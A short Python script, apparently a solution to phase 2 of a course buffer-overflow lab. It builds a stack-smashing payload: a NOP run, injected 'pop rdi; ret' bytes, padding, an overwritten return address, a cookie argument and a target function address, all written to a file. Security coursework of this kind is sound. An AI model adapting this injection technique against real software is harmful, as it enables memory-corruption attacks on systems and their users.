# Phase 2

import struct

def p64(d):
	return struct.pack('Q', d)

COOKIE = 0x76927bbf
TOUCH = [
	0x00000000004018c8,
	0x00000000004018f4,
	0x00000000004019c9
]
BUFFER_ADDRESS = 0x5566fd78
OFFSET = 40

POP_RDI = '\x5F'
RET_OP  = '\xC3'

exploit = ''
exploit += '\x90' * 10 + POP_RDI
exploit += RET_OP
exploit += 'A' * (OFFSET - len(exploit))
exploit += p64(BUFFER_ADDRESS)
exploit += p64(COOKIE)
exploit += p64(TOUCH[1])

with open('exploit_2.txt', 'w') as f:
	f.write(exploit)
